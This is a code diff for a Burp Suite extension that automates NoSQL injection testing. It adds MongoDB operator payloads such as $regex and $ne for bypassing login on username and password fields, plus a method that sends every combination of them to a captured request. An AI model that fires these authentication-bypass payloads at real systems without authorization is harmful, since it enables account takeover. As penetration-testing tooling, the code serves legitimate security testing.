@@ -34,6 +34,7 @@ public class NNN implements BurpExtension {
         this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" ||1|| "), " ||1|| ", null));
 
         // Payloads for username field
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin.*\"}"), "{\"$regex\":\"admin.*\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("admin"), "admin", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $regex \":\" admin .*\"}"), "{\" $regex \":\" admin .*\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
@@ -45,7 +46,7 @@ public class NNN implements BurpExtension {
         // Payloads for password field
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \":\" invalidpassword \"}"), "{\" $ne \":\" invalidpassword \"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": \" xd \"}"), "{\" $ne \": \" xd \"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$ne\": \"xd\"}"), "{\"$ne\": \"xd\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
 
@@ -129,11 +130,12 @@ public class NNN implements BurpExtension {
         api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         new Thread(() -> {
             try {
+                HttpRequest request2send;
+                HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
                 for (Payload payload : payloadsArrayList){
                     if (payload.payloadType == PayloadType.FUZZ_STRING) {
-                        HttpRequestResponse response2receive;
-                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
+                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                         api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                         if (request2send.method().equals("POST")) {
                             response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
@@ -153,11 +155,12 @@ public class NNN implements BurpExtension {
         api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         new Thread(() -> {
             try {
+                HttpRequest request2send;
+                HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
                 for (Payload payload : payloadsArrayList){
                     if (payload.payloadType == PayloadType.BOOLEAN) {
-                        HttpRequestResponse response2receive;
-                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
+                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
                         api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                         if (request2send.method().equals("POST")) {
                             response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
@@ -177,15 +180,18 @@ public class NNN implements BurpExtension {
         api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         new Thread(() -> {
             try {
+                HttpRequest request2send;
+                HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
                 for (Payload payload : payloadsArrayList){
                     if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_USERNAME) {
-                        HttpRequestResponse response2receive;
-                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
-                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
-                        if (request2send.method().equals("POST")) {
+                        if (requestResponse.request().method().equals("POST")) {
+                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payload + requestResponse.request().toString().substring(endIndex));
+                            api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                             response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                         } else {
+                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
+                            api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                             response2receive = api.http().sendRequest(request2send);
                         }
                         api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
@@ -201,20 +207,67 @@ public class NNN implements BurpExtension {
         api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         new Thread(() -> {
             try {
+                HttpRequest request2send;
+                HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
                 for (Payload payload : payloadsArrayList){
                     if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_PASSWORD) {
-                        HttpRequestResponse response2receive;
-                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
-                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
-                        if (request2send.method().equals("POST")) {
+                        if (requestResponse.request().method().equals("POST")) {
+                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payload + requestResponse.request().toString().substring(endIndex));
+                            api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                             response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                         } else {
+                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
+                            api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
                             response2receive = api.http().sendRequest(request2send);
                         }
                         api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
                     }
                 }
+            } catch (Exception e) {
+                api.logging().logToOutput("[!] Request failed");
+            }
+        }).start();
+    }
+
+
+    static void authenticationTest(HttpRequestResponse requestResponse, Integer startUsernameIndex, Integer endUsernameIndex, Integer startPasswordIndex, Integer endPasswordIndex) {
+        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
+        new Thread(() -> {
+            try {
+                HttpRequest request2send;
+                HttpRequestResponse response2receive;
+                HttpService httpService = requestResponse.request().httpService();
+                for (Payload payload1 : payloadsArrayList){
+                    if (payload1.payloadType == PayloadType.AUTHENTICATION_BYPASS_USERNAME) {
+                        for (Payload payload2 : payloadsArrayList) {
+                            if (payload2.payloadType == PayloadType.AUTHENTICATION_BYPASS_PASSWORD) {
+                                if (requestResponse.request().method().equals("POST")) {
+                                    if (startUsernameIndex > startPasswordIndex) {
+                                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startUsernameIndex) + payload1.payload + requestResponse.request().toString().substring(endUsernameIndex));
+                                        request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startPasswordIndex) + payload2.payload + request2send.toString().substring(endPasswordIndex));
+                                    } else {
+                                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startPasswordIndex) + payload2.payload + requestResponse.request().toString().substring(endPasswordIndex));
+                                        request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startUsernameIndex) + payload1.payload + request2send.toString().substring(endUsernameIndex));
+                                    }
+                                    api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
+                                    response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                                } else {
+                                    if (startUsernameIndex > startPasswordIndex) {
+                                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startUsernameIndex) + payload1.payloadUrlEncoded + requestResponse.request().toString().substring(endUsernameIndex));
+                                        request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startPasswordIndex) + payload2.payloadUrlEncoded + request2send.toString().substring(endPasswordIndex));
+                                    } else {
+                                        request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startPasswordIndex) + payload2.payloadUrlEncoded + requestResponse.request().toString().substring(endPasswordIndex));
+                                        request2send = HttpRequest.httpRequest(httpService, request2send.toString().substring(0, startUsernameIndex) + payload1.payloadUrlEncoded + request2send.toString().substring(endUsernameIndex));
+                                    }
+                                    api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
+                                    response2receive = api.http().sendRequest(request2send);
+                                }
+                                api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+                            }
+                        }
+                    }
+                        }
             } catch (Exception e) {
                 api.logging().logToOutput("[!] Request failed");
             }
